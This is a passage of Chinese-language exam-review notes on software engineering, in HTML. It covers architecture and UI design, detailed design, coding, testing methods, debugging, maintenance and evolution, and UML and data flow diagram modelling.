/li><li>任何一个服务既可以充当服务的提供方，接受其他服务的访问请求；也可充当服务的请求方，请求其他服务为其提供功能</li><li>任何服务需要向服务注册中心进行注册登记，描述其可提供的服务以及访问方式，才可对外提供服务</li></ul></li><li>总线风格：包含了一组软构件和一条称为“消息总线”的连接件来连接各个软构件</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B" tabindex="-1">（2）软件体系结构设计过程</h4><ul><li><p>软件体系结构设计的原则</p><ul><li>高层抽象和组织</li><li>模块化</li><li>信息隐藏</li><li>软件重用</li><li>多视点分离<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></li></ul></li><li><p>设计初步的软件体系结构</p><ul><li>任务：基于功能性和非功能性软件需求，参考业界已有的软件体系结构设计风格，设计出目标软件系统的初始体系结构，明确每个构件的职责以及构件间的通信和协作关系</li><li>输出：初步的软件体系结构<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E4%B8%8D%E5%90%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E9%A3%8E%E6%A0%BC%E9%80%82%E5%90%88%E7%9A%84%E5%BA%94%E7%94%A8.jpg" alt></li></ul></li><li><p>重用开源软件及已有软件资产</p><ul><li>可直接使用的软件资产<ul><li>清晰地定义它们与当前软件系统间的交互接口</li><li>包括数据交换的格式、互操作协议等</li></ul></li><li>不可直接使用但具复用潜力的设计资产<ul><li>采用接口重构、适配器等方法将其引入到当前体系结构中</li><li>接口重构是指，调整当前体系结构中面向可复用设计资产的调用接口，使之与其提供的服务接口相匹配</li></ul></li></ul></li><li><p>精化软件体系结构</p><ul><li>选择软件体系结构所依赖的公共基础设施：如操作系统、软件中间件、数据库管理系统、软件开发框架、安全服务等</li><li>确定软件体系结构中的设计元素：包括子系统、软构件和关键设计类等，明确其职责和接口，从而为开展详细设计奠定基础</li></ul></li><li><p>设计部署模型：刻画软件系统的各个子系统、软构件如何部署到计算节点上运行的，描述它们的部署和运行环境</p></li></ul><h3 id="3-%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1" tabindex="-1">3 用户界面设计</h3><h4 id="%EF%BC%881%EF%BC%89%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%9F%BA%E7%A1%80" tabindex="-1">（1）用户界面基础</h4><ul><li><p>人机交互的关键</p><ul><li>用户的满意度</li><li>方便输入</li><li>直观输出</li></ul></li><li><p>用户界面元素及实现方式</p><ul><li>静态元素</li><li>动态元素</li><li>用户输入元素</li><li>用户命令元素</li></ul></li><li><p>用UML类图表示用户界面元素</p><ul><li>窗口或对话框 -&gt; 对象类</li><li>静态和动态元素 -&gt; 类属性</li><li>输入元素 -&gt; 类属性</li><li>命令元素 -&gt; 类方法</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B" tabindex="-1">（2）用户界面设计过程</h4><ul><li><p>用户界面设计的任务</p><ul><li>根据软件需求及其操作流程，为其设计出与用户进行交互的界面，支持用户对软件的操作和使用</li></ul></li><li><p>用户界面设计的原则</p><ul><li>直观性</li><li>易操作性</li><li>反应性</li><li>一致性</li><li>容错性</li><li>人性化</li></ul></li><li><p>用户界面设计的过程<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></p></li><li><p>用户界面初步设计</p><ul><li>根据需求确定用户界面</li><li>确定用户界面的设计元素（属性和操作）</li></ul></li><li><p>建立用户界面间的跳转关系</p><ul><li>用UML图来表示用户界面的跳转关系<ul><li>交互图：表示特定场景下的跳转及跳转发生时的消息传递</li><li>类图：表示界面间所有可能发生的跳转及跳转的原因</li></ul></li></ul></li></ul><h3 id="4-%E8%BD%AF%E4%BB%B6%E8%AF%A6%E7%BB%86%E8%AE%BE%E8%AE%A1" tabindex="-1">4 软件详细设计</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AF%A6%E7%BB%86%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80" tabindex="-1">（1）软件详细设计基础</h4><ul><li>详细设计的任务<ul><li>输入：软件体系结构设计、用户界面设计、软件需求</li><li>任务：对体系结构设计和用户界面设计成果进行细化和精化，获得高质量、面向实现的设计模型</li></ul></li><li>软件详细设计UML模型（活动图）</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AF%A6%E7%BB%86%E8%AE%BE%E8%AE%A1%E6%B4%BB%E5%8A%A8" tabindex="-1">（2）软件详细设计活动</h4><ul><li>用例设计<ul><li>任务：为需求模型中每个用例设计软件实现方案</li><li>原则：整体性、正确性、优化性等</li><li>输出：用例实现方案的交互图、设计类图</li></ul></li><li>类设计<ul><li>任务<ul><li>对界面类、关键设计类、设计类等进行设计优化和精化，</li><li>明确设计类的内部实现细节</li><li>精化到可以提交软件实现的程度</li></ul></li><li>结果<ul><li>类图、状态图、活动图等</li></ul></li></ul></li><li>数据设计<ul><li>任务<ul><li>设计需要持久保存的数据以及这些数据之间的关系</li><li>数据组织方式（例如关系数据库中的表、关键字、外键等）之间进行映射</li><li>为提高数据存储、操作性能而设计持久存储机制优化设施</li></ul></li><li>设计与建模<ul><li>设计数据的结构、存储、组织和访问</li><li>对数据设计的结果进行建模</li></ul></li></ul></li><li>子系统<ul><li>任务<ul><li>确定子系统内部结构，设置包含于其中的更小粒度子系统、构件和设计类，明确它们之间的协作关系</li><li>确保它们能够协同实现子系统接口规定的所有功能和行为</li></ul></li></ul></li><li>构件设计<ul><li>任务<ul><li>定义构件内部的设计元素及其协作方法</li><li>内部设计元素可以是子构件，也可以是粒度更细的类</li></ul></li></ul></li></ul><h3 id="5-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%95%B4%E5%90%88%E3%80%81%E9%AA%8C%E8%AF%81%E5%8F%8A%E8%AF%84%E5%AE%A1" tabindex="-1">5 软件设计整合、验证及评审</h3><ul><li>设计整合<ul><li>汇总迄今获得的所有设计模型<ul><li>包括体系结构模型、界面设计模型、用例设计模型、子系统/构件/类设计模型、数据模型等</li></ul></li><li>形成系统、完整的软件设计方案</li></ul></li><li>设计验证<ul><li>验证整个设计的正确性、优化性和充分性等</li><li>验证设计模型之间的不一致性、冗余性等</li><li>发现设计方案中的问题并进行整改</li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0%E5%92%8C%E6%B5%8B%E8%AF%95" tabindex="-1">第七章 软件实现和测试</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0" tabindex="-1">1 软件实现</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0%E6%A6%82%E8%BF%B0" tabindex="-1">（1）软件实现概述</h4><ul><li><p>软件实现的任务</p><ul><li>根据软件设计模型（包括体系结构设计模型、用户界面设计模型和详细设计模型），采用编程语言编写出目标软件系统的程序代码，并对代码进行必要的测试，以发现和纠正代码存在中的缺陷，并将可运行的目标代码部署到目标计算机上运行<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B.jpg" alt></li></ul></li><li><p>这三项工作均由程序员负责完成</p><ul><li>编码：基于软件设计模型和文档，采用选定的程序设计语言，编写出目标软件系统的程序代码</li><li>单元测试：对自己编写的各个基本模块进行单元测试，以发现模块单元中存在的缺陷和问题</li><li>调试：发现产生缺陷原因，定位缺陷位置，进而对代码缺陷进行修复</li></ul></li><li><p>软件测试由软件测试工程师完成</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%80%89%E6%8B%A9" tabindex="-1">（2）编程语言的类型和选择</h4><ul><li>选择<ul><li>软件的应用领域<ul><li>不同应用领域的软件通常会选择不同的程序设计语言来加以实现</li><li>科学和工程计算领域选用Fortran、C等程序设计语言，数据库应用软件开发会选用Delphi、Visual Basic、SQL等程序设计语言，机器人等嵌入式应用选用C、C++、Python等程序设计语言，互联网应用开发选用Java、ASP等程序设计语言</li></ul></li><li>与遗留软件系统的交互</li><li>软件的特殊功能及需求<ul><li>是否需要与底层的硬件系统进行交互，如果需要，可以考虑采用诸如C、汇编语言</li><li>是否需要丰富的软件库来支持功能的实现，如果需要，可以考虑具有丰富软件库的编程语言，如Python、Java等</li><li>是否需要对相关的知识进行表示和推理，如果需要，可以考虑选用描述性的程序设计语言，如Prolog、Lisp等</li></ul></li><li>软件的目标平台<ul><li>如果目标软件系统需要部署在J2EE架构之上，那么就需要选择Java编程语言；如果需要借助于ROS来开发机器人软件，那么建议选择C、C++和Python等编程语言</li></ul></li><li>程序员的编程经验</li></ul></li></ul><h3 id="2-%E7%BC%96%E7%A0%81" tabindex="-1">2 编码</h3><h4 id="%EF%BC%881%EF%BC%89%E7%BC%96%E7%A0%81%E6%A6%82%E8%BF%B0" tabindex="-1">（1）编码概述</h4><ul><li>编码的原则<ul><li>易读，一看就懂</li><li>易改，便于维护</li><li>降低代码的复杂度</li><li>尽可能地开展软件重用和编写可重用的程序代码</li><li>要有处理异常和提高代码的容错性</li><li>代码要与模型和文档相一致</li></ul></li><li>遵循编码风格</li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%BC%96%E7%A0%81%E8%BF%87%E7%A8%8B" tabindex="-1">（2）编码过程</h4><ul><li>编写类代码<ul><li>编写实现类的代码</li><li>编写实现类方法的代码</li><li>编写实现类间关联的代码</li><li>编写实现设计类间聚合和组合关系的代码</li><li>编写实现接口关系的代码</li><li>编写实现继承关系的程序代码</li><li>编写实现包的代码</li></ul></li><li>编写用户界面代码</li><li>代码片段的重用</li></ul><h4 id="%EF%BC%883%EF%BC%89%E7%BC%BA%E9%99%B7" tabindex="-1">（3）缺陷</h4><ul><li>软件缺陷是指软件制品中存在不正确的软件描述和实现</li></ul><h3 id="3-%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95" tabindex="-1">3 软件测试</h3><h4 id="%EF%BC%881%EF%BC%89%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0" tabindex="-1">（1）测试概述</h4><ul><li>软件缺陷不可避免</li><li>如何应对缺陷？<ul><li>预防缺陷</li><li>容忍缺陷</li><li>发现缺陷</li><li>修复缺陷</li></ul></li><li>何为软件测试<ul><li>运行软件或模拟软件的执行，发现软件缺陷的过程——缺陷测试</li><li>向开发人员和客户展示软件的有效性——确认测试</li></ul></li><li>软件测试的原理<ul><li>程序本质上是对数据的处理<ul><li>设计数据(测试用例) -&gt; 运行测试用例(程序来处理数据) -&gt; 判断运行结果(是否符合预期结果)</li></ul></li></ul></li><li>测试执行的步骤<ul><li><ol><li>明确待测试对象</li></ol></li><li><ol start="2"><li>设计测试用例</li></ol></li><li><ol start="3"><li>运行代码和测试用例</li></ol></li><li><ol start="4"><li>分析运行结果</li></ol></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E8%AE%BE%E8%AE%A1" tabindex="-1">（2）测试用例设计</h4><ul><li><p>测试用例是一个四元偶</p><ul><li>输入数据：交由待测试程序代码进行处理的数据</li><li>前置条件：程序处理输入数据的运行上下文，即要满足前置条件</li><li>测试步骤：程序代码对输入数据的处理可能涉及到一系列的步骤，其中的某些步骤需要用户的进一步输入</li><li>预期输出：程序代码的预期输出结果</li></ul></li><li><p>白盒测试技术：基于程序内部的执行流程来设计测试用例</p><ul><li>特点：必须了解程序的内部工作流程才能设计测试用例</li><li>基本路径测试<ul><li><ol><li>根据程序逻辑画出流程图</li></ol></li><li><ol start="2"><li>将流程图转换为流图</li></ol></li><li><ol start="3"><li>确定基本路径集合</li></ol></li><li><ol start="4"><li>针对测试路径设计测试用例</li></ol></li></ul></li></ul></li><li><p>黑盒测试技术：基于程序的外在功能和接口来设计测试用例</p><ul><li>特点：<ul><li>知道程序功能和性能，不必了解程序内部结构和处理细节</li><li>黑盒测试与软件如何实现无关，如果软件实现发生变化，测试用例仍然可以使用</li><li>黑盒测试用例的开发可以与软件开发并行进行，能够缩短软件开发周期</li></ul></li><li>方法：<ul><li>等价分类法<ul><li>思想<ul><li>把程序的输入数据集合按输入条件划分为若干个等价类</li><li>每一个等价类对于输入条件而言是等价的</li><li>为每一个等价类设计一个测试用例，包括有效或无效的输入</li></ul></li><li>优点<ul><li>可以滤掉同类数据，减少测试次数，不丢失发现错误的机会</li></ul></li></ul></li><li>边界值分析法</li></ul></li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E7%AD%96%E7%95%A5" tabindex="-1">（3）软件测试的过程和策略</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%92%8C%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%85%B3%E7%B3%BB.jpg" alt></p><ul><li><p>单元测试</p><ul><li>测试对象<ul><li>对软件基本模块单元进行测试</li><li>过程、函数、方法、类</li></ul></li><li>测试方法：大多采用白盒测试技术</li></ul></li><li><p>集成测试</p><ul><li>测试对象<ul><li>对软件模块之间的接口进行测试</li><li>过程调用、函数调用、消息传递、远程过程调用</li></ul></li><li>测试技术：采用黑盒测试技术</li></ul></li><li><p>确认测试</p><ul><li>测试对象<ul><li>对软件的功能和性能进行测试</li><li>判断目标软件系统是否满足用户需求</li></ul></li><li>依据和标准<ul><li>软件需求规格说明书</li></ul></li><li>测试技术：采用黑盒测试技术</li></ul></li><li><p>α测试</p><ul><li>软件开发公司组织内部人员模拟各类用户行为对即将面市的软件产品（称为α版本、内部测试版）进行测试，发现错误并修正</li><li>尽可能逼真地模拟实际运行环境和用户对软件产品的操作，并尽最大努力涵盖所有可能的用户操作方式</li><li>经α测试并进行修改后的软件产品称为β版本（也称外部测试版）</li></ul></li><li><p>β测试</p><ul><li>软件开发公司组织各方面的典型用户在日常工作中实际使用β版本，或为对外进行宣传而将β版本免费赠送给典型用户（很多情况下，β版本可以通过Internet免费下载，也可以向软件公司索取），并要求用户报告异常情况、提出批评意见</li><li>β测试是在与开发者无法控制的环境下进行的软件现场应用</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95" tabindex="-1">（4）面向对象软件测试</h4><ul><li>OO软件的构成基础与传统结构化程序设计不同</li><li>需要开发测试驱动程序</li><li>采用白盒测试方法</li></ul><h4 id="%EF%BC%885%EF%BC%89%E9%9D%9E%E5%8A%9F%E8%83%BD%E6%80%A7%E6%B5%8B%E8%AF%95" tabindex="-1">（5）非功能性测试</h4><ul><li>性能测试</li><li>强度测试</li><li>配置和兼容性测试</li><li>安全性测试</li><li>可靠性测试</li><li>用户界面测试</li><li>本地化测试</li><li>Web测试</li><li>安装测试</li></ul><h3 id="4-%E8%BD%AF%E4%BB%B6%E8%B0%83%E8%AF%95" tabindex="-1">4 软件调试</h3><ul><li>软件调试就是要基于程序代码，确定软件缺陷的原因、定位缺陷的位置，从而知道那里错了、如何修复缺陷</li><li>目的<ul><li>测试发现缺陷</li><li>调试定位缺陷</li><li>排错纠正错误</li></ul></li><li>独立性不同<ul><li>测试由独立的测试小组进行</li><li>调试和排错由开发人员完成<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%B0%83%E8%AF%95%E7%9A%84%E6%AD%A5%E9%AA%A4.jpg" alt></li></ul></li></ul><h2 id="%E7%AC%AC%E5%85%AB%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E5%92%8C%E6%BC%94%E5%8C%96" tabindex="-1">第八章 软件维护和演化</h2><h3 id="1.-%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E4%B8%8E%E6%BC%94%E5%8C%96" tabindex="-1">1. 软件维护与演化</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4" tabindex="-1">（1）软件维护</h4><ul><li><p>软件变更和修改是不可避免的</p><ul><li>待修复的错误</li><li>需求的变更/新的需求</li><li>技术和商务环境变化</li><li>系统的性能或可靠性等需要改进</li><li>系统中增加了新的计算机和设备</li></ul></li><li><p>软件需要进行维护</p><ul><li>出故障，不可正常工作</li><li>服务变化，需要升级</li><li>运行环境变化，需要适应</li></ul></li><li><p>软件维护：软件在交付使用后，由于应用需求和环境变化以及自身问题，对软件系统进行改造和调整的过程</p></li><li><p>维护形式：</p><ul><li>纠正性维护：纠正软件中的缺陷和错误</li><li>完善性维护：对软件进行改造以增加新的功能、修改已有的功能</li><li>适应性维护：对软件进行改造以便适应新的运行环境和平台</li><li>预防性维护：对软件结构进行改造以便提高软件的可靠性和可维护性等</li></ul></li><li><p>软件维护工程师</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%BC%94%E5%8C%96" tabindex="-1">（2）软件演化</h4><ul><li>特点：软件演化与开发是一个集成的、完整的、增量式的过程，可以用螺旋模型表示。主要针对软件的大规模功能增强和结构调整，以实现变化的软件需求，或者提高软件系统的质量。</li></ul><table><thead><tr><th>概念</th><th>功能增强粒度</th><th>应对变化方式</th><th>持续性或间隔性</th><th>版本变化</th></tr></thead><tbody><tr><td>软件演化</td><td>粗粒度</td><td>主动</td><td>持续性</td><td>是</td></tr><tr><td>软件维护</td><td>细粒度</td><td>被动</td><td>间隔性</td><td>不一定</td></tr></tbody></table><ul><li>软件演化法则<ul><li>持续变化法则</li><li>增加复杂性法则</li><li>自我调节法则</li><li>组织稳定性守恒法则</li><li>熟悉度守恒法则</li><li>功能持续增长法则</li><li>质量衰减法则</li><li>反馈系统法则</li></ul></li></ul><h3 id="2.-%E8%BD%AF%E4%BB%B6%E9%80%BB%E8%BE%91%E8%80%81%E5%8C%96" tabindex="-1">2. 软件逻辑老化</h3><h4 id="%EF%BC%881%EF%BC%89%E9%80%BB%E8%BE%91%E8%80%81%E5%8C%96%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">（1）逻辑老化的特点</h4><ul><li>何为逻辑老化<ul><li>软件在维护和演化的过程中出现的用户满意度降低、质量逐渐下降、变更成本不断上升这样一种现象</li></ul></li><li>软件逻辑老化的现象<ul><li>质量下降</li><li>变更成本增加</li><li>用户满意度降低</li></ul></li><li>软件逻辑老化的原因<ul><li>缺乏变更</li><li>负面变更</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%A7%A3%E5%86%B3%E9%80%BB%E8%BE%91%E8%80%81%E5%8C%96%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（2）解决逻辑老化的方法</h4><p>逻辑老化软件的维护和升级将会收到预算、期限等多种因素的约束，因此维护团队需要对逻辑老化软件基于其质量（失效率和可维护性等）及其业务价值（系统的使用情况、支持的业务流程、系统的可靠性、输出的价值）进行评估，再做出适当决策。</p><h3 id="3.-%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%8E%E6%8A%80%E6%9C%AF" tabindex="-1">3. 软件维护的过程与技术</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E6%8A%80%E6%9C%AF" tabindex="-1">（1）软件维护技术</h4><ul><li>代码重组：在不改变软件功能的前提下，对程序代码进行重新组织，使得重组后的代码具有更好的可维护性，能够有效支持对代码的变更</li><li>逆向工程：基于低抽象层次软件制品，通过对其进行理解和分析，产生高抽象层次的软件制品</li><li>设计重构</li><li>再工程</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E8%BF%87%E7%A8%8B" tabindex="-1">（2）软件维护过程</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E8%BF%87%E7%A8%8B.jpg" alt></p><ul><li>软件维护需要解决的问题<ul><li>人员的问题</li><li>软件制品的问题</li><li>维护副作用的问题</li><li>维护成本不断增加的问题</li></ul></li></ul><h2 id="%E5%A4%8D%E4%B9%A0%E9%87%8D%E7%82%B9" tabindex="-1">复习重点</h2><h3 id="%E7%BB%93%E6%9E%84%E5%8C%96%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95" tabindex="-1">结构化需求分析方法</h3><ul><li>基本思想：数据主义认为，整个宇宙都是由数据流构成的，各个数据处理系统构成人类的社会</li><li>数据流图<ul><li>Data Flow Diagram(简称DFD)：描述输入数据流到输出数据流的变换(即加工)过程，用于对系统的功能建模</li><li>基本元素<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/5_1_2_1_1.jpg" alt></li></ul></li><li>画分层数据流图的步骤<ul><li><ol><li>画系统的输入和输出</li></ol></li><li><ol start="2"><li>画系统内部</li></ol></li><li><ol start="3"><li>画加工内部</li></ol></li><li><ol start="4"><li>根据自顶向下逐层分解的思想，重复第3步，继续分解加工，直至每个尚未分解的加工都足够简单(即不必再分解)</li></ol></li></ul></li><li>分层数据流图示例——空巢老人看护系统<ul><li>确定源或宿：老人、家属、医生、机器人和时钟<ul><li>除了时钟外，都既是源又是宿</li></ul></li><li>顶层图唯一的加工：软件系统(空巢老人看护系统)</li><li>确定数据流：系统的输入/输出信息<ul><li>输入数据流：老人的呼叫、家属和医生的控制命令、老人的图像和视频、定时器</li><li>输出数据流：家属和医生的语音和视频、异常状态和警告信息、机器人执行指令</li></ul></li><li>顶层图通常没有文件<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E5%B7%A5%E9%A1%B6%E5%B1%82%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.jpg" alt><br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E5%B7%A5%E6%80%BB%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.jpg" alt></li></ul></li></ul><h3 id="%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95" tabindex="-1">面向对象需求分析方法</h3><ul><li><p>基本思想:现实世界（应用问题）还是计算机世界（软件系统），它们都是由多样化的对象所构成的，每个对象都有其状态并可提供功能和服务，不同对象之间通过交互来开展协作来实现功能和提供服务</p></li><li><p>面向对象软件工程提供对象、类、属性、操作、消息、继承等概念来抽象表示现实世界的应用，分析其软件需求特征，建立起软件需求模型，描述软件需求</p></li><li><p>面向对象建模语言</p><ul><li>概念:基于面向对象的概念和抽象，提供图形化的图符，用来表示软件系统的一种语言</li><li>示例：<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E9%A1%BA%E5%BA%8F%E5%9B%BE.jpg" alt></li></ul></li><li><p>UML: Unified Modeling Language</p><ul><li>Unified(统一)<ul><li>提取不同方法中最好建模技术，如OMT(James Rumbaugh)，Booch method(Grady Booch )和OOSE(Ivar Jacobson)</li><li>采用统一、标准化的表示方式</li></ul></li><li>Modeling(建模)<ul><li>对现实系统和软件系统进行可视化建模</li><li>建立系统模型</li></ul></li><li>Language(语言)<ul><li>图形化语言：语法、语义和语用<ul><li>包括规则，约束 扩展机制</li></ul></li></ul></li><li>UML用途：用来可视化(visualize) 、描述(specify)、构造(construct)和文档化(document)软件密集型系统的各种产品</li></ul></li><li><p>多视点建模</p><ul><li>结构视点（Structural View）<ul><li>用于描述系统的构成</li><li>UML提供了包图（Package Diagram）、类图（Class Diagram）、对象图（Object Diagram）和构件图（Component Diagram），从不同的抽象层次来表示系统的静态组织及结构</li></ul></li><li>行为视点（Behavioral View）<ul><li>刻画系统的行为</li><li>UML提供了交互图（Interaction Diagram）、状态图（Statechart Diagram）与活动图（Activity Diagram），以从不同侧面刻画系统的动态行为。</li></ul></li><li>部署视点（Deployment View）<ul><li>刻画目标软件系统的软件制品及其运行环境</li><li>UML提供了部署图（Deployment Diagram）来描述软件系统的部署模型</li></ul></li><li>用例视点（Use Case View）<ul><li>刻画系统的功能</li><li>UML提供了用例图（Use Case Diagram）以描述系统的用例及其与外部执行者之间的关系。<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%BB%BA%E6%A8%A1%E8%AF%95%E7%82%B9%E5%9B%BE.jpg" alt></li></ul></li></ul></li><li><p>面向对象需求分析步骤</p><ul><li>明确问题边界，获取软件需求，建立用例模型</li><li>开展用例分析，精化软件需求，建立分析模型</li><li>汇总需求模型，撰写需求文档，评审软件需求</li></ul></li></ul><h3 id="%E7%94%A8%E4%BE%8B%E5%9B%BE%E6%8F%8F%E8%BF%B0" tabindex="-1">用例图描述</h3><ul><li><p>用例图用来描述初步软件需求</p></li><li><p>图的构成</p><ul><li>执行者<ul><li>系统之外的实体，他们使用软件系统功能、与软件系统交换信息</li><li>可以是一类用户，也可以是其他软件系统或物理设备</li></ul></li><li>用例<ul><li>表示执行者为达成一项相对独立、完整的业务目标而要求软件系统完成的功能</li></ul></li><li>边：执行者与用例间、用例之间、执行者之间的关系<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E6%89%A7%E8%A1%8C%E8%80%85%E4%B8%8E%E7%94%A8%E4%BE%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.jpg" alt></li></ul></li><li><p>用例间的关系</p><ul><li>用例间的关系-包含关系<ul><li>如果用例B是用例A的某项子功能，则称用例A包含用例B</li></ul></li><li>用例间的关系-扩展关系<ul><li>如果用例A与B相似，但A的功能较B多，A的动作序列是在B的动作序列中的某些执行点上插入附加动作序列而构成的，则称用例A扩展用例B</li></ul></li><li>用例间的关系-继承<ul><li>如果A与B相似，但A的动作序列是通过改写B的部分动作或者扩展B的动作而获得的，则称用例A继承用例B<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%94%A8%E4%BE%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.jpg" alt></li></ul></li><li>边界框<ul><li>表示整个软件系统或子系统的边界<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%A9%BA%E5%B7%A2%E8%80%81%E4%BA%BA%E7%9C%8B%E6%8A%A4%E8%BD%AF%E4%BB%B6%E7%94%A8%E4%BE%8B%E5%9B%BE.jpg" alt></li></ul></li></ul></li></ul><h3 id="uml%E4%BA%A4%E4%BA%92%E5%9B%BE" 